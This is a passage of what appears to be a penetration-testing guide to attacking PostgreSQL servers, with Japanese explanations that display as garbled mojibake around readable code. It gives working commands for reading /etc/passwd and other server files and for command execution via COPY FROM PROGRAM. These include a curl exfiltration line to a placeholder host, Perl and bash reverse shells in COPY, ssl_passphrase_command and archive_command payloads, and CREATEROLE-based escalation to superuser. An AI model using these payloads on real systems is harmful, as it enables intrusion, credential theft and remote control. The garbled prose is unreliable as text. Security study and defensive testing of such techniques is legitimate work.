\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã®æ“ä½œ

### ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã¨ãƒ•ã‚¡ã‚¤ãƒ«ã®èª­ã¿å–ã‚Š

ã“ã®[**commit**](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a)ã‹ã‚‰ã€**`DEFAULT_ROLE_READ_SERVER_FILES`**ã‚°ãƒ«ãƒ¼ãƒ—ï¼ˆ**`pg_read_server_files`**ã¨å‘¼ã°ã‚Œã‚‹ï¼‰ã®ãƒ¡ãƒ³ãƒãƒ¼ã¨**ã‚¹ãƒ¼ãƒ‘ãƒ¼ãƒ¦ãƒ¼ã‚¶ãƒ¼**ã¯ã€ä»»æ„ã®ãƒ‘ã‚¹ã§**`COPY`**ãƒ¡ã‚½ãƒƒãƒ‰ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼ˆ`genfile.c`ã®`convert_and_check_filename`ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼‰ã€‚
```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
{% hint style="warning" %}
ã‚¹ãƒ¼ãƒ‘ãƒ¼ãƒ¦ãƒ¼ã‚¶ãƒ¼ã§ã¯ãªã„ãŒã€**CREATEROLE** æ¨©é™ã‚’æŒã£ã¦ã„ã‚‹å ´åˆã€**è‡ªåˆ†è‡ªèº«ã‚’ãã®ã‚°ãƒ«ãƒ¼ãƒ—ã®ãƒ¡ãƒ³ãƒãƒ¼ã«ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™:**
```sql
GRANT pg_read_server_files TO username;
```
[**è©³ç´°æƒ…å ±**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

ä»–ã®**postgresé–¢æ•°**ã‚’ä½¿ç”¨ã—ã¦ã€**ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿å–ã‚‹ã‹ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã‚’ãƒªã‚¹ãƒˆã™ã‚‹**ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã‚‰ã®é–¢æ•°ã¯ã€**ã‚¹ãƒ¼ãƒ‘ãƒ¼ãƒ¦ãƒ¼ã‚¶ãƒ¼**ãŠã‚ˆã³**æ˜ç¤ºçš„ãªæ¨©é™ã‚’æŒã¤ãƒ¦ãƒ¼ã‚¶ãƒ¼**ã®ã¿ãŒä½¿ç”¨ã§ãã¾ã™ã€‚
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
ã‚ˆã‚Šå¤šãã®é–¢æ•°ã¯[https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html)ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

### ç°¡å˜ãªãƒ•ã‚¡ã‚¤ãƒ«æ›¸ãè¾¼ã¿

ãƒ•ã‚¡ã‚¤ãƒ«ã®æ›¸ãè¾¼ã¿ã«ã¯ã€**ã‚¹ãƒ¼ãƒ‘ãƒ¼ãƒ¦ãƒ¼ã‚¶ãƒ¼**ã¨**`pg_read_server_files`**ã®ãƒ¡ãƒ³ãƒãƒ¼ã®ã¿ãŒcopyã‚’ä½¿ç”¨ã§ãã¾ã™ã€‚
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
{% hint style="warning" %}
ã‚¹ãƒ¼ãƒ‘ãƒ¼ãƒ¦ãƒ¼ã‚¶ãƒ¼ã§ã¯ãªã„ãŒã€**`CREATEROLE`** æ¨©é™ã‚’æŒã£ã¦ã„ã‚‹å ´åˆã€**ãã®ã‚°ãƒ«ãƒ¼ãƒ—ã®ãƒ¡ãƒ³ãƒãƒ¼ã«è‡ªåˆ†è‡ªèº«ã‚’è¿½åŠ ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™:**
```sql
GRANT pg_write_server_files TO username;
```
[**è©³ç´°æƒ…å ±**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

COPYã¯æ”¹è¡Œæ–‡å­—ã‚’å‡¦ç†ã§ããªã„ãŸã‚ã€ãƒ™ãƒ¼ã‚¹64ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ã„ã¦ã‚‚ã€**1è¡Œã®ã‚³ãƒãƒ³ãƒ‰ã‚’é€ä¿¡ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™**ã€‚\
ã“ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã®éå¸¸ã«é‡è¦ãªåˆ¶é™ã¯ã€**`copy`ã¯ãƒã‚¤ãƒŠãƒªãƒ•ã‚¡ã‚¤ãƒ«ã®æ›¸ãè¾¼ã¿ã«ä½¿ç”¨ã§ããªã„ãŸã‚ã€ä¸€éƒ¨ã®ãƒã‚¤ãƒŠãƒªå€¤ã‚’å¤‰æ›´ã—ã¾ã™ã€‚**

### **ãƒã‚¤ãƒŠãƒªãƒ•ã‚¡ã‚¤ãƒ«ã®ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰**

ãŸã ã—ã€**å¤§ããªãƒã‚¤ãƒŠãƒªãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã™ã‚‹ãŸã‚ã®ä»–ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯**ãŒã‚ã‚Šã¾ã™ï¼š

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md" %}
[big-binary-files-upload-postgresql.md](../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md)
{% endcontent-ref %}

## <img src="../.gitbook/assets/i3.png" alt="" data-size="original">

**ãƒã‚°ãƒã‚¦ãƒ³ãƒ†ã‚£ã®ãƒ’ãƒ³ãƒˆ**ï¼š**Intigriti**ã«**ã‚µã‚¤ãƒ³ã‚¢ãƒƒãƒ—**ã—ã¦ãã ã•ã„ã€‚ã“ã‚Œã¯ã€ãƒãƒƒã‚«ãƒ¼ã«ã‚ˆã£ã¦ä½œæˆã•ã‚ŒãŸãƒ—ãƒ¬ãƒŸã‚¢ãƒ ãª**ãƒã‚°ãƒã‚¦ãƒ³ãƒ†ã‚£ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ **ã§ã™ï¼ä»Šã™ã[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)ã«å‚åŠ ã—ã¦ã€æœ€å¤§**$100,000**ã®ãƒã‚¦ãƒ³ãƒ†ã‚£ã‚’ç²å¾—ã—ã¾ã—ã‚‡ã†ï¼

{% embed url="https://go.intigriti.com/hacktricks" %}

## RCE

### **ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã¸ã®RCE**

[ãƒãƒ¼ã‚¸ãƒ§ãƒ³9.3](https://www.postgresql.org/docs/9.3/release-9-3.html)ä»¥é™ã€RCEã«ã¯**ã‚¹ãƒ¼ãƒ‘ãƒ¼ãƒ¦ãƒ¼ã‚¶ãƒ¼**ã¨**`pg_execute_server_program`**ã‚°ãƒ«ãƒ¼ãƒ—ã®ãƒ¡ãƒ³ãƒãƒ¼ã®ã¿ãŒcopyã‚’ä½¿ç”¨ã§ãã¾ã™ï¼ˆä¾‹ï¼šæƒ…å ±ã®å¤–éƒ¨æµå‡ºï¼š
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
å®Ÿè¡Œã®ä¾‹:
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
{% hint style="warning" %}
ã‚¹ãƒ¼ãƒ‘ãƒ¼ãƒ¦ãƒ¼ã‚¶ãƒ¼ã§ã¯ãªã„ãŒã€**`CREATEROLE`** æ¨©é™ã‚’æŒã£ã¦ã„ã‚‹å ´åˆã€**ãã®ã‚°ãƒ«ãƒ¼ãƒ—ã®ãƒ¡ãƒ³ãƒãƒ¼ã«è‡ªåˆ†è‡ªèº«ã‚’è¿½åŠ ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™:**
```sql
GRANT pg_execute_server_program TO username;
```
[**è©³ç´°ã¯ã“ã¡ã‚‰**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

ã¾ãŸã¯ã€**metasploit**ã®`multi/postgres/postgres_copy_from_program_cmd_exec`ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚ã“ã®è„†å¼±æ€§ã«ã¤ã„ã¦ã®è©³ç´°ã¯[**ã“ã¡ã‚‰**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5)ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚CVE-2019-9193ã¨ã—ã¦å ±å‘Šã•ã‚Œã¦ã„ã¾ã™ãŒã€Postgesã¯ã“ã‚Œã‚’[æ©Ÿèƒ½ã¨ã—ã¦ä¿®æ­£ã—ãªã„](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/)ã¨å®£è¨€ã—ã¾ã—ãŸã€‚

### PostgreSQLè¨€èªã‚’ä½¿ç”¨ã—ãŸRCE

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md" %}
[rce-with-postgresql-languages.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md)
{% endcontent-ref %}

### PostgreSQLæ‹¡å¼µæ©Ÿèƒ½ã‚’ä½¿ç”¨ã—ãŸRCE

å‰ã®æŠ•ç¨¿ã‹ã‚‰**ãƒã‚¤ãƒŠãƒªãƒ•ã‚¡ã‚¤ãƒ«ã®ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰æ–¹æ³•**ã‚’å­¦ã‚“ã å¾Œã€**PostgreSQLæ‹¡å¼µæ©Ÿèƒ½ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã—ã¦ãƒ­ãƒ¼ãƒ‰ã™ã‚‹**ã“ã¨ã§**RCEã‚’å–å¾—**ã—ã‚ˆã†ã¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md" %}
[rce-with-postgresql-extensions.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md)
{% endcontent-ref %}

### PostgreSQLè¨­å®šãƒ•ã‚¡ã‚¤ãƒ«RCE

PostgreSQLã®**è¨­å®šãƒ•ã‚¡ã‚¤ãƒ«**ã¯ã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚’å®Ÿè¡Œã—ã¦ã„ã‚‹**postgresãƒ¦ãƒ¼ã‚¶ãƒ¼**ã«ã‚ˆã£ã¦**æ›¸ãè¾¼ã¿å¯èƒ½**ã§ã™ã€‚ã—ãŸãŒã£ã¦ã€**ã‚¹ãƒ¼ãƒ‘ãƒ¼ãƒ¦ãƒ¼ã‚¶ãƒ¼**ã¨ã—ã¦ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã«ãƒ•ã‚¡ã‚¤ãƒ«ã‚’æ›¸ãè¾¼ã‚€ã“ã¨ãŒã§ãã€ã—ãŸãŒã£ã¦ã“ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚’**ä¸Šæ›¸ã**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

![](<../.gitbook/assets/image (303).png>)

#### **ssl\_passphrase\_commandã‚’ä½¿ç”¨ã—ãŸRCE**

è¨­å®šãƒ•ã‚¡ã‚¤ãƒ«ã«ã¯ã€RCEã«ã¤ãªãŒã‚‹å¯èƒ½æ€§ã®ã‚ã‚‹ã„ãã¤ã‹ã®èˆˆå‘³æ·±ã„å±æ€§ãŒã‚ã‚Šã¾ã™ã€‚

* `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã®ãƒ—ãƒ©ã‚¤ãƒ™ãƒ¼ãƒˆã‚­ãƒ¼ã¸ã®ãƒ‘ã‚¹
* `ssl_passphrase_command = ''` ãƒ—ãƒ©ã‚¤ãƒ™ãƒ¼ãƒˆãƒ•ã‚¡ã‚¤ãƒ«ãŒãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã§ä¿è­·ã•ã‚Œã¦ã„ã‚‹å ´åˆï¼ˆæš—å·åŒ–ã•ã‚Œã¦ã„ã‚‹å ´åˆï¼‰ã€postgresqlã¯ã“ã®å±æ€§ã§æŒ‡å®šã•ã‚ŒãŸã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã—ã¾ã™ã€‚
* `ssl_passphrase_command_supports_reload = off` ã“ã®å±æ€§ãŒ**ã‚ªãƒ³**ã®å ´åˆã€ã‚­ãƒ¼ãŒãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã§ä¿è­·ã•ã‚Œã¦ã„ã‚‹å ´åˆã«å®Ÿè¡Œã•ã‚Œã‚‹**ã‚³ãƒãƒ³ãƒ‰**ã¯ã€`pg_reload_conf()`ãŒ**å®Ÿè¡Œ**ã•ã‚ŒãŸã¨ãã«**å®Ÿè¡Œã•ã‚Œã¾ã™**ã€‚

ã—ãŸãŒã£ã¦ã€æ”»æ’ƒè€…ã¯æ¬¡ã®æ‰‹é †ã‚’å®Ÿè¡Œã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼š

1. ã‚µãƒ¼ãƒãƒ¼ã‹ã‚‰**ãƒ—ãƒ©ã‚¤ãƒ™ãƒ¼ãƒˆã‚­ãƒ¼ã‚’ãƒ€ãƒ³ãƒ—**ã™ã‚‹
2. ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸãƒ—ãƒ©ã‚¤ãƒ™ãƒ¼ãƒˆã‚­ãƒ¼ã‚’**æš—å·åŒ–**ã™ã‚‹ï¼š`rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. ä¸Šæ›¸ãã™ã‚‹
4. ç¾åœ¨ã®postgresqlã®**è¨­å®š**ã‚’**ãƒ€ãƒ³ãƒ—**ã™ã‚‹
5. ä¸Šè¨˜ã®å±æ€§è¨­å®šã§**è¨­å®š**ã‚’**ä¸Šæ›¸ã**ã™ã‚‹ï¼š
   - `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
   - `ssl_passphrase_command_supports_reload = on`
6. `pg_reload_conf()`ã‚’å®Ÿè¡Œã™ã‚‹

ã“ã‚Œã‚’ãƒ†ã‚¹ãƒˆã—ã¦ã¿ãŸã¨ã“ã‚ã€**ãƒ—ãƒ©ã‚¤ãƒ™ãƒ¼ãƒˆã‚­ãƒ¼ãƒ•ã‚¡ã‚¤ãƒ«ãŒ640ã®æ¨©é™ã‚’æŒã¡**ã€**rootãŒæ‰€æœ‰**ã—ã€**ã‚°ãƒ«ãƒ¼ãƒ—ssl-certã¾ãŸã¯postgres**ï¼ˆpostgresãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒèª­ã¿å–ã‚Œã‚‹ã‚ˆã†ã«ï¼‰ã§ã‚ã‚‹å¿…è¦ãŒã‚ã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã—ãŸã€‚ã¾ãŸã€_ /var/lib/postgresql/12/main_ã«é…ç½®ã•ã‚Œã¦ã„ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

ã“ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã«ã¤ã„ã¦ã®**è©³ç´°ã¯[ã“ã¡ã‚‰](https://pulsesecurity.co.nz/articles/postgres-sqli)**ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚

#### **archive\_commandã‚’ä½¿ç”¨ã—ãŸRCE**

è¨­å®šãƒ•ã‚¡ã‚¤ãƒ«ã®ã‚‚ã†1ã¤ã®æ”»æ’ƒå¯èƒ½ãªå±æ€§ã¯`archive_command`ã§ã™ã€‚

ã“ã‚Œã‚’å‹•ä½œã•ã›ã‚‹ã«ã¯ã€`archive_mode`è¨­å®šãŒ`'on'`ã¾ãŸã¯`'always'`ã§ã‚ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ãã‚ŒãŒçœŸã§ã‚ã‚‹å ´åˆã€`archive_command`ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä¸Šæ›¸ãã—ã¦ã€WALï¼ˆWrite-Ahead Loggingï¼‰æ“ä½œã‚’ä»‹ã—ã¦å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ä¸€èˆ¬çš„ãªæ‰‹é †ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™ï¼š

1. ã‚¢ãƒ¼ã‚«ã‚¤ãƒ–ãƒ¢ãƒ¼ãƒ‰ãŒæœ‰åŠ¹ã‹ã©ã†ã‹ã‚’ç¢ºèªã™ã‚‹ï¼š`SELECT current_setting('archive_mode')`
2. ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã§`archive_command`ã‚’ä¸Šæ›¸ãã™ã‚‹ã€‚ãŸã¨ãˆã°ã€ãƒªãƒãƒ¼ã‚¹ã‚·ã‚§ãƒ«ï¼š`archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'`
3. è¨­å®šã‚’ãƒªãƒ­ãƒ¼ãƒ‰ã™ã‚‹ï¼š`SELECT pg_reload_conf()`
4. WALæ“ä½œã‚’å¼·åˆ¶çš„ã«å®Ÿè¡Œã—ã€ã‚¢ãƒ¼ã‚«ã‚¤ãƒ–ã‚³ãƒãƒ³ãƒ‰ã‚’å‘¼ã³å‡ºã™ï¼š`SELECT pg_switch_wal()`ã¾ãŸã¯ä¸€éƒ¨ã®Postgresãƒãƒ¼ã‚¸ãƒ§ãƒ³ã§ã¯`SELECT pg_switch_xlog()`

ã“ã®è¨­å®šã¨WALã«é–¢ã™ã‚‹**è©³ç´°ã¯[ã“ã¡ã‚‰](https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)**ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚

## **Postgres Privesc**

### CREATEROLE Privesc

#### **Grant**

[**ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆ**](https://www.postgresql.org/docs/13/sql-grant.html)ã«ã‚ˆã‚‹ã¨ã€**`CREATEROLE`**æ¨©é™ã‚’æŒã¤ãƒ­ãƒ¼ãƒ«ã¯ã€**ã‚¹ãƒ¼ãƒ‘ãƒ¼ãƒ¦ãƒ¼ã‚¶ãƒ¼ã§ã¯ãªã„****ä»»æ„ã®ãƒ­ãƒ¼ãƒ«ã®ãƒ¡ãƒ³ãƒãƒ¼ã‚·ãƒƒãƒ—ã‚’ä»˜ä¸ã¾ãŸã¯å–ã‚Šæ¶ˆã™**ã“ã¨ãŒã§ãã¾ã™ã€‚

ã—ãŸãŒã£ã¦ã€**`CREATEROLE`**æ¨©é™ãŒã‚ã‚‹å ´åˆã€ä»–ã®**ãƒ­ãƒ¼ãƒ«**ï¼ˆã‚¹ãƒ¼ãƒ‘ãƒ¼ãƒ¦ãƒ¼ã‚¶ãƒ¼ã§ã¯ãªã„ï¼‰ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹æ¨©é™ã‚’è‡ªåˆ†è‡ªèº«ã«ä»˜ä¸ã™ã‚‹ã“ã¨ãŒã§ãã€ãƒ•ã‚¡ã‚¤ãƒ«ã®èª­ã¿æ›¸ãã‚„ã‚³ãƒãƒ³ãƒ‰ã®å®Ÿè¡Œãªã©ã®ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’å¾—ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®å¤‰æ›´

ã“ã®å½¹å‰²ã‚’æŒã¤ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ã€ä»–ã®**éã‚¹ãƒ¼ãƒ‘ãƒ¼ãƒ¦ãƒ¼ã‚¶ãƒ¼**ã®**ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰**ã‚’**å¤‰æ›´**ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### SUPERUSERã¸ã®ç‰¹æ¨©æ˜‡æ ¼

**ãƒ­ãƒ¼ã‚«ãƒ«ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’å…¥åŠ›ã›ãšã«PostgreSQLã«ãƒ­ã‚°ã‚¤ãƒ³ã§ãã‚‹**ã“ã¨ã¯éå¸¸ã«ä¸€èˆ¬çš„ã§ã™ã€‚ã—ãŸãŒã£ã¦ã€**ã‚³ãƒ¼ãƒ‰ã®å®Ÿè¡Œæ¨©é™ã‚’å–å¾—ã—ãŸå¾Œã¯ã€ã“ã‚Œã‚‰ã®æ¨©é™ã‚’æ‚ªç”¨ã—ã¦`SUPERUSER`ãƒ­ãƒ¼ãƒ«ã‚’å–å¾—**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
{% hint style="info" %}
ã“ã‚Œã¯é€šå¸¸ã€**`pg_hba.conf`** ãƒ•ã‚¡ã‚¤ãƒ«å†…ã®æ¬¡ã®è¡Œã«ã‚ˆã£ã¦å¯èƒ½ã«ãªã‚Šã¾ã™ï¼š
```bash
# "local" is for Unix domain socket connections only
local   all             all                                     trust
# IPv4 local connections:
host    all             all             127.0.0.1/32            trust
# IPv6 local connections:
host    all             all             ::1/128                 trust
```
{% endhint %}

### **ALTER TABLEã®ç‰¹æ¨©æ˜‡æ ¼**

[ã“ã®è§£èª¬è¨˜äº‹](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities)ã§ã¯ã€Postgres GCPã§ALTER TABLEã®ç‰¹æ¨©ã‚’æ‚ªç”¨ã—ã¦ç‰¹æ¨©æ˜‡æ ¼ãŒå¯èƒ½ã§ã‚ã£ãŸæ–¹æ³•ãŒèª¬æ˜ã•ã‚Œã¦ã„ã¾ã™ã€‚

é€šå¸¸ã€åˆ¥ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ãƒ†ãƒ¼ãƒ–ãƒ«ã®æ‰€æœ‰è€…ã«ã™ã‚‹ã“ã¨ã¯ã‚¨ãƒ©ãƒ¼ãŒç™ºç”Ÿã™ã‚‹ã¯ãšã§ã™ãŒã€ã©ã†ã‚„ã‚‰GCPã§ã¯éã‚¹ãƒ¼ãƒ‘ãƒ¼ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®postgresãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ãã®ã‚ªãƒ—ã‚·ãƒ§ãƒ³ãŒä¸ãˆã‚‰ã‚Œã¦ã„ã¾ã—ãŸã€‚

ã“ã®è€ƒãˆã‚’çµã³ã¤ã‘ã‚‹ã¨ã€INSERT/UPDATE/ANALYZEã‚³ãƒãƒ³ãƒ‰ãŒã‚¤ãƒ³ãƒ‡ãƒƒã‚¯ã‚¹é–¢æ•°ã‚’æŒã¤ãƒ†ãƒ¼ãƒ–ãƒ«ã§å®Ÿè¡Œã•ã‚Œã‚‹ã¨ã€é–¢æ•°ã¯ã‚³ãƒãƒ³ãƒ‰ã®ä¸€éƒ¨ã¨ã—ã¦ãƒ†ãƒ¼ãƒ–ãƒ«ã®æ‰€æœ‰è€…ã®æ¨©é™ã§å‘¼ã³å‡ºã•ã‚Œã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ã€‚ãã®ãŸã‚ã€é–¢æ•°ã‚’ä½¿ç”¨ã—ã¦ã‚¤ãƒ³ãƒ‡ãƒƒã‚¯ã‚¹ã‚’ä½œæˆã—ã€ãã®ãƒ†ãƒ¼ãƒ–ãƒ«ã«å¯¾ã—ã¦æ‰€æœ‰è€…ã®ç‰¹æ¨©ã‚’æŒã¤ã‚¹ãƒ¼ãƒ‘ãƒ¼ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ä¸ãˆã€ãã®å¾Œã€æ‚ªæ„ã®ã‚ã‚‹é–¢æ•°ã‚’ä½¿ç”¨ã—ã¦ãƒ†ãƒ¼ãƒ–ãƒ«ä¸Šã§ANALYZEã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€æ‰€æœ‰è€…ã®ç‰¹æ¨©ã‚’ä½¿ç”¨ã—ã¦ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### æ‚ªç”¨

1. æ–°ã—ã„ãƒ†ãƒ¼ãƒ–ãƒ«ã‚’ä½œæˆã—ã¾ã™ã€‚
2. ãƒ€ãƒŸãƒ¼ã®ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’ãƒ†ãƒ¼ãƒ–ãƒ«ã«æŒ¿å…¥ã—ã€ã‚¤ãƒ³ãƒ‡ãƒƒã‚¯ã‚¹é–¢æ•°ãŒå‡¦ç†ã™ã‚‹ã‚‚ã®ã‚’ç”¨æ„ã—ã¾ã™ã€‚
3. ãƒ†ãƒ¼ãƒ–ãƒ«ã«æ‚ªæ„ã®ã‚ã‚‹ã‚¤ãƒ³ãƒ‡ãƒƒã‚¯ã‚¹é–¢æ•°ï¼ˆã‚³ãƒ¼ãƒ‰å®Ÿè¡Œãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’å«ã‚€ï¼‰ã‚’ä½œæˆã—ã¾ã™ã€‚
4. ãƒ†ãƒ¼ãƒ–ãƒ«ã®æ‰€æœ‰è€…ã‚’ cloudsqladmin ã«å¤‰æ›´ã—ã¾ã™ã€‚ã“ã‚Œã¯GCPã®ã‚¹ãƒ¼ãƒ‘ãƒ¼ãƒ¦ãƒ¼ã‚¶ãƒ¼ãƒ­ãƒ¼ãƒ«ã§ã‚ã‚Šã€Cloud SQLãŒãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚’ç¶­æŒãŠã‚ˆã³ç®¡ç†ã™ã‚‹ãŸã‚ã«ã®ã¿ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚
